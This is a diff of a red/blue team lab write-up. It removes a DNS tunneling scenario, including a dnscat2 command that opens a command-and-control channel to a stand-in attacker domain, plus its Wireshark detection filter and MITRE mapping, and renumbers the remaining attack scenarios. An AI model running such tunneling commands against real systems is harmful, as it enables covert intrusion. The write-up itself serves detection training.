@@ -96,22 +96,7 @@ I acted as both:
 
 ---
 
-### ✅ Scenario 5 — DNS Tunneling for C2
-- **Red Team Action:**  
-  Used dnscat2 on the victim to establish a C2 channel via DNS queries:
-  ```bash
-  dnscat2 --dns domain=attacker.domain --port 53
-  ```
-  Attacker ran the dnscat2 server on Kali to receive tunneled commands.
-
-- **Blue Team Detection (Wireshark):**  
-  Filter: `dns.qry.type == TXT or dns.qry.type == AAAA`  
-  Observed unusually long or frequent DNS queries with encoded payloads, indicating tunneling.  
-  **MITRE Mapping:** T1071.004 – Application Layer Protocol: DNS; T1572 – Protocol Tunneling.
-
----
-
-### ✅ Scenario 6 — SMB Lateral Movement
+### ✅ Scenario 5 — SMB Lateral Movement
 - **Red Team Action:**  
   From the victim, used Impacket's smbclient to move laterally to another host and execute a command:
   ```bash
@@ -126,7 +111,7 @@ I acted as both:
 
 ---
 
-### ✅ Scenario 7 — Ransomware Simulation (File Encryption Traffic)
+### ✅ Scenario 6 — Ransomware Simulation (File Encryption Traffic)
 - **Red Team Action:**  
   Deployed a simulated ransomware payload that encrypted files and exfiltrated a ransom note via HTTPS:
   ```powershell
@@ -142,7 +127,7 @@ I acted as both:
 
 ---
 
-### ✅ Scenario 8 — Phishing Link Resolution and Callback
+### ✅ Scenario 7 — Phishing Link Resolution and Callback
 - **Red Team Action:**  
   Simulated a phishing email click by resolving a malicious domain and calling back for a payload:
   ```cmd
@@ -163,7 +148,6 @@ I acted as both:
 - **Reverse Shells:** Persistent outbound connections to non-standard ports with interactive data.
 - **Data Exfiltration:** Anomalous data volumes in HTTP, FTP, or SMB traffic.
 - **Beaconing:** Timed, repetitive patterns without user interaction.
-- **DNS Tunneling:** Oversized or high-volume DNS queries.
 - **SMB Lateral Movement:** Admin share access and file transfers.
 - **Ransomware Traffic:** Rapid file operations followed by exfiltration.
 - **Phishing Callbacks:** Suspicious DNS resolutions to unknown domains.
@@ -177,7 +161,6 @@ I acted as both:
 | Data Exfiltration        | T1041, T1567          | Exfiltration Over C2 Channel; Exfiltration Over Web Service |
 | Beaconing                | T1071.001, T1571      | Application Layer Protocol: Web Protocols; Non-Standard Port |
 | FTP Exfiltration         | T1048, T1020          | Exfiltration Over Alternative Protocol; Automated Exfiltration |
-| DNS Tunneling            | T1071.004, T1572      | Application Layer Protocol: DNS; Protocol Tunneling |
 | SMB Lateral Movement      | T1021.002, T1570      | Remote Services: SMB/Windows Admin Shares; Lateral Tool Transfer |
 | Ransomware Simulation     | T1486, T1041          | Data Encrypted for Impact; Exfiltration Over C2 Channel |
 | Phishing Link Resolution  | T1566, T1598          | Phishing; Phishing for Information              |
